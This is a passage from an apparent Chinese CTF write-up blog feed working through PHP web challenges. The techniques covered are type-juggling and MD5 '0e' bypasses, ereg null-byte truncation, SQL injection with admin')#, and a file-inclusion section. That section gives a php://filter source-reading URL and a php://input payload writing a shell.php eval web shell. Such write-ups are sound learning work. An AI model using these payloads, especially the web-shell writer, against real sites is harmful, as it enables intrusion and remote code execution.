class="line"><span class="built_in">return</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="built_in">echo</span> noother_says_correct(<span class="variable">$temp</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求传一个password值进去，password不能是1-9的数字，而且要和3735929054相等，转化为十六进制数:deadc0de<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/20.php?password=0xdeadc0de</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'-'</span>) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>还是ereg()的%00截断，而且输入的值小于8位，大于9999999，使用科学计数法，输入1e8,00截断*-*即可<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/5.php?password=1e8%00*-*</span><br></pre></td></tr></table></figure></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>nctf差不多的题目，必须是1-9的数字，而且要包含#biubiubiu<br>坑点:#需要用url编码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/15.php?ctf=1%00%23biubiubiu</span><br></pre></td></tr></table></figure></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="variable">$c</span> = 0;</span><br><span class="line"><span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>))</span><br><span class="line"><span class="variable">$c</span> += 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>post了一个空数组上去就弹出flag了…具体原因有待学习</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://s1.ax1x.com/2018/11/30/FmIdEQ.md.png" alt=""></h2><p>有两个题目挂掉了…….做不了暂时就写这么多吧…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在读吴翰清先生的《白帽子讲Web安全》
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学CTF平台Writeup</title>
    <link href="https://gardenia30.top/2018/11/09/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6CTF%E5%B9%B3%E5%8F%B0Writeup/"/>
    <id>https://gardenia30.top/2018/11/09/南京邮电大学CTF平台Writeup/</id>
    <published>2018-11-09T07:14:45.000Z</published>
    <updated>2018-12-22T11:33:46.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给自己一个备忘录，记录学习过程<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web题解"><a href="#Web题解" class="headerlink" title="Web题解"></a>Web题解</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><strong>1.直接包含内有运行代码的文件</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include <span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>那么就可以通过抓包修改file值的办法去运行一些本来不该运行的文件也可以通过此方法直接输出一些敏感的配置文件和远程包含shell（需要目标主机开启allow_url_fopen)<br><strong>2.通过PHP内置协议直接读取代码</strong><br>通过构造以下语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure></p><p>就能获得xxx.php的代码的base64加密结果，通过base64解密后便可获得xxx.php的代码<br><strong>3.写入php文件</strong><br>使用如下URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php?file=php://input</span><br></pre></td></tr></table></figure></p><p>并在http头里提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_post[&apos;xxx&apos;];?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure></p><p>就能在index.php目录下生成shell.php</p><p>此题考查顾名思义为文件包含漏洞，点开click me? no;<br><img src="https://s1.ax1x.com/2018/11/09/ibA5fe.png" alt="打开界面"><br><img src="https://s1.ax1x.com/2018/11/09/ibAqmt.png" alt="点开以后的URL"><br>通过URL里<strong>?file=show.php</strong>大致可以确定为是GET方式提交<br>构造以下语句：<br><img src="https://s1.ax1x.com/2018/11/09/ibEn1J.png" alt="构造的URL"><br>得到一大串的base64编码，进行base64解码得到php代码里就有flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="built_in">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="variable">$file</span>); </span><br><span class="line">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>这一题是一个PHP弱类型绕过的题目<br><img src="https://s1.ax1x.com/2018/11/13/iOHTeJ.png" alt=""><br>具体的PHP弱类型分析参考的是这一篇文章：<a href="http://www.cnblogs.com/Mrsm1th/p/6745532.html" target="_blank" rel="noopener">http://www.cnblogs.com/Mrsm1th/p/6745532.html</a><br>php中有两种比较的符号 == 与 ===<br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较<br>题目如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">    die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以当判断中为”==”的时候会将两边先转换为一样的数据类型;0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!<br>因为是GET方式提交的数据，所以可以直接修改url的值来提交a和b的值，提交两个结果MD5加密以后前两位都是0e的值，这样php就会认为这两个值经过MD5加密以后的值都为0，所以就可以直接爆出flag<br><img src="https://s1.ax1x.com/2018/11/13/iX3CHf.png" alt=""></p><h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>题目如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'nctf'</span>]) === FALSE)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)   </span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这题考察的是ereg()的00截断，满足nctf必须是1-9的实数；<br>strpos函数判断的是后面的字符中在前面的字符中出现的位置，返回其位置，从0开始；<br>所以试一下1%00#biubiubiu,先截断输入的数字，使ereg()函数不能识别到%00后面字符，所以就顺利绕过ereg()函数的判断，<br>其次要使得strpos函数识别到nctf中包含了#biubiubiu这一串字符，<br>但是在url中不能识别#，所以就使用url编码%23来替换#，所以构造如下的url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu</span><br></pre></td></tr></table></figure></p><p>就可以直接弹出flag<br><img src="https://s1.ax1x.com/2018/11/14/iXLhvV.png" alt=""></p><h3 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h3><p>SQL注入题，源码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">Secure Web Login</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$user</span> = trim(<span class="variable">$_POST</span>[user]);</span><br><span class="line">  <span class="variable">$pass</span> = md5(trim(<span class="variable">$_POST</span>[pass]));</span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">"select user from ctf where (user='"</span>.<span class="variable">$user</span>.<span class="string">"') and (pw='"</span>.<span class="variable">$pass</span>.<span class="string">"')"</span>; admin</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>.<span class="variable">$sql</span>;</span><br><span class="line">  <span class="variable">$query</span> = mysql_fetch_array(mysql_query(<span class="variable">$sql</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$query</span>[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$query</span>[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$query</span>[user];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=text name=user value=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=pass value=<span class="string">"Password"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">"index.phps"</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>和老师上课讲的例子很吻合，就是一个很基础的用引号强行将原来的引号闭合，然后添加上括号，用#对后面的内容进行注释就可以了<br>题目要求用admin登录才可以获取flag，所以注入的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;)#</span><br></pre></td></tr></table></figure></p><p>闭合掉单引号然后闭合括号，注释掉后面对pass的判断，直接弹出flag<br><img src="https://s1.ax1x.com/2018/11/15/iv41B9.png" alt=""></p><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>这题是在页面给了提示robots.txt<br><img src="https://s1.ax1x.com/2018/11/15/ivIMw9.png" alt=""><br>查看此文件的内容得到如下的内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TIP:sql.php</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$id</span> = intval(<span class="variable">$_GET</span>[id]);</span><br><span class="line">  <span class="variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='<span class="variable">$id</span>'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_GET</span>[id]==1024) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="variable">$query</span>[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>tip为sql.php,然后还要用GET传一个id上去，这个id经过intval()函数以后赋值$id,要求传的id不等于1024<br>但是要得到id=1024的值，所以试一下1024.1成功得到flag<br>但是自己依旧是一脸懵逼…不知道咋的就蹦出来flag；<br><img src="https://s1.ax1x.com/2018/11/15/ivoKc8.png" alt=""><br>事后查了一下intval函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span>(intval(1024.1));</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span>(intval(1024.4));</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span>(intval(1024.5));</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span>(intval(1024.9));</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这是测试的结果<br><img src="https://s1.ax1x.com/2018/11/15/ivoMjS.png" alt=""><br>测试了一下这个函数的用处:intval最常用的是在程序中功滤入进数据库的变量，将其转换为整型<br>所以只要传一个整型值为1024而且自生不是1024的数值进去就可以了……soga……</p><h3 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h3><p>题目给出了源码,代码审计题<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span>=@<span class="variable">$_POST</span>[<span class="string">'pass'</span>];</span><br><span class="line"><span class="variable">$pass1</span>=***********;//被隐藏起来的密码</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp(<span class="variable">$pass</span>,<span class="variable">$pass1</span>))&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>也就是strcmp($pass,$pass1)值为0的时候输出flag，所以应该又是绕过之类的题目，小白不知道这个函数的作用个，所以上网科普了一下，PHP中strcmp函数的作用如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"Hello world!"</span>,<span class="string">"Hello world!"</span>); // 两字符串相等</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"Hello world!"</span>,<span class="string">"Hello"</span>); // string1 大于 string2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"Hello world!"</span>,<span class="string">"Hello world! Hello!"</span>); // string1 小于 string2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">0</span><br><span class="line">7</span><br><span class="line">-7</span><br></pre></td></tr></table></figure></p><p>以上代码用于测试此函数的作用结果显而易见，len(string1)==len(string2)返回0，否则返回string1比string2长多少或者短多少。<br>此题要求<strong>strcmp($pass,$pass1)</strong>的值为0，你不可能知道pass1的长度，所以要想办法绕过这个条件满足条件，上网搜索了一下，发现只要post一个数组过去就可以了，写一个py脚本传参到指定的url<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">"http://chinalover.sinaapp.com/web21/"</span></span><br><span class="line">s=requests.Session()</span><br><span class="line">post=&#123;<span class="string">"pass[]"</span>:1&#125;</span><br><span class="line"><span class="built_in">print</span>(s.post(url,data=post).text)</span><br></pre></td></tr></table></figure></p><p>得到flag如下：<br><img src="https://s1.ax1x.com/2018/11/17/izcFJS.png" alt=""></p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" 